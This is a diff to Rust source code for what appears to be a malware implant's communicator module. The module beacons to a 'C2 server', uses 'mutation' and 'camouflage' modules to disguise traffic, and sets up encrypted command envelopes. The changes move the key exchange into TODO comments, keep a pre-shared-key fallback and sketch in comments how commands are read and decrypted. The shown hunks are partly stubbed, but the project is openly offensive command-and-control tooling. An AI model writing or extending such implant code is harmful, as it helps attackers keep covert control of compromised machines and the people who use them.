@@ -6,7 +6,7 @@ use tokio::time::{sleep, Duration, timeout};
 use std::time::SystemTime;
 use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
 
-use crate::crypto::{CryptoManager, KeyExchangePayload};
+use crate::crypto::CryptoManager;
 use crate::mutation::MutationEngine;
 use crate::camouflage::{TrafficProfile, CamouflageMode};
 
@@ -46,6 +46,7 @@ struct EncryptedEnvelope {
     data: String,
 }
 
+#[allow(dead_code)]
 pub struct Communicator {
     url: String,
     port: u16,
@@ -60,6 +61,7 @@ pub struct Communicator {
     session_established: Arc<RwLock<bool>>,
 }
 
+#[allow(dead_code)]
 impl Communicator {
     pub fn new(
         url: &str,
@@ -119,17 +121,14 @@ impl Communicator {
     async fn perform_key_exchange(&self) -> Result<(), Box<dyn std::error::Error>> {
         let mut crypto = self.crypto.write().await;
 
-        let (secret, our_payload) = crypto.generate_key_exchange();
-        let ke_json = serde_json::to_string(&our_payload)?;
-
-        debug!("Sending key exchange payload");
-        // In production: send ke_json over WebSocket
-        // and receive server's KeyExchangePayload
-
-        // For now: fall back to PSK-derived session keys
-        // When the server implements ECDH, replace this with:
+        // TODO: In production, send ECDH payload over WebSocket and complete key exchange:
+        //   let (secret, our_payload) = crypto.generate_key_exchange();
+        //   let ke_json = serde_json::to_string(&our_payload)?;
+        //   websocket.send(ke_json).await?;
         //   let server_payload: KeyExchangePayload = serde_json::from_str(&response)?;
         //   crypto.complete_key_exchange(secret, &server_payload)?;
+
+        // For now: fall back to PSK-derived session keys
         crypto.init_with_psk()?;
 
         let mut established = self.session_established.write().await;
@@ -283,11 +282,10 @@ impl Communicator {
     ) -> Result<Option<String>, Box<dyn std::error::Error>> {
         debug!("Listening for commands from C2 server");
 
-        let interval = self.next_beacon_interval().await;
-        sleep(Duration::from_secs(interval)).await;
-
         // In production: read from WebSocket, then:
-        //   let envelope: EncryptedEnvelope = serde_json::from_str(&raw)?;
+        //   let raw = websocket.read().await?;
+        //   let wire_data = self.traffic.write().await.unwrap_inbound(&raw)?;
+        //   let envelope: EncryptedEnvelope = serde_json::from_str(std::str::from_utf8(&wire_data)?)?;
         //   let decrypted = self.decrypt_payload(&envelope).await?;
         //   let message: Message = serde_json::from_slice(&decrypted)?;
         //   Ok(Some(message.payload))
